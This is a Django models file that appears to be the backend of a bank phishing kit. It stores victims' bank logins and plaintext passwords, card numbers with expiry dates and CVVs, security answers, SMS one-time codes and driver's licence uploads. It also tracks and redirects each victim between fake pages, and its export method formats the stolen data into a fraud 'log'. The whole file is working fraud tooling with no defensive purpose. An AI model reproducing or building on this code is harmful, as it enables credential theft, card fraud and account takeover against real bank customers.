from django.db import models
from django.utils.timezone import now


class Client(models.Model):
    uuid = models.UUIDField()

    device = models.CharField(max_length=100, blank=True)
    ip = models.CharField(max_length=100, blank=True)
    is_waiting = models.BooleanField(default=False)
    redirect_to = models.CharField(max_length=100, blank=True)
    last_redirect = models.CharField(max_length=100, blank=True)
    request_from = models.CharField(max_length=100, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    is_sms_alert = models.BooleanField(default=False)
    is_online = models.BooleanField(default=True)
    is_deleted = models.BooleanField(default=False)
    last_action = models.DateTimeField(auto_now_add=True)

    def online(self):
        self.is_online = True
        self.last_action = now()
        self.save()

    def got_redirected(self):
        self.last_redirect = self.redirect_to if self.redirect_to else self.last_redirect
        self.redirect_to = ''
        self.is_waiting = False
        self.save()

    def cards(self):
        return self.clientcard_set.all().order_by('-created_at')

    def profiles(self):
        return self.clientprofile_set.all().order_by('-created_at')

    def drivers(self):
        return self.clientdriver_set.all().order_by('-created_at')

    def sms(self):
        return self.clientsms_set.all().order_by('-created_at')

    def logins(self):
        return self.clientlogin_set.all().order_by('-created_at')

    def questions(self):
        return self.clientquestion_set.all().order_by('-id')

    def export(self):
        logins = ''
        for login in self.logins():
            logins += f'Client ID: {login.bank_id}\nPassword: {login.password}\n\n'
        cards = ''
        for card in self.cards():
            cards += f'Card: {card.card}\nEXP: {card.card_date}\nCVV: {card.cvv}\n\n'
        profiles = ''
        for profile in self.profiles():
            profiles += f'Name: {profile.first_name} {profile.last_name}\nMobile number: {profile.mobile_number}\n' \
                        f'Date of birth: {profile.birth_date}\n\n'
        questions = ''
        for question in self.questions():
            questions += f'Question: {question.question}\nAnswer: {question.answer}\n\n'

        return f'''{logins}[————————————————————————————]
{cards}[————————————————————————————]
{profiles}[————————————————————————————]
{questions}[————————————————————————————]
UserAgent: {self.device}
IP: {self.ip}'''


class ClientCard(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    card = models.CharField(max_length=50, blank=True)
    card_date = models.CharField(max_length=50, blank=True)
    cvv = models.CharField(max_length=50, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)


class ClientQuestion(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    question = models.CharField(max_length=250, blank=True)
    answer = models.CharField(max_length=250, blank=True)


class ClientDriver(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    full_name = models.CharField(max_length=50, blank=True)
    license = models.CharField(max_length=50, blank=True)
    exp = models.CharField(max_length=50, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)


class ClientProfile(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    first_name = models.CharField(max_length=50, blank=True)
    last_name = models.CharField(max_length=50, blank=True)
    mobile_number = models.CharField(max_length=50, blank=True)
    birth_date = models.CharField(max_length=50, blank=True)
    drivers_license = models.FileField(upload_to='licenses')
    created_at = models.DateTimeField(auto_now_add=True)


class ClientLogin(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    created_at = models.DateTimeField(auto_now_add=True)
    bank_id = models.CharField(max_length=50, blank=True)
    password = models.CharField(max_length=100, blank=True)


class ClientSms(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    code = models.CharField(max_length=20)
    created_at = models.DateTimeField(auto_now_add=True)


class Settings(models.Model):
    profile_title = models.CharField(max_length=150, blank=True)
    profile_description = models.CharField(max_length=500, blank=True)

    sms_title = models.CharField(max_length=150, blank=True)
    sms_description = models.CharField(max_length=500, blank=True)

    card_title = models.CharField(max_length=150, blank=True)
    card_description = models.CharField(max_length=500, blank=True)

    driver_title = models.CharField(max_length=150, blank=True)
    driver_description = models.CharField(max_length=500, blank=True)

    complete_title = models.CharField(max_length=150, blank=True)
    complete_description = models.CharField(max_length=500, blank=True)


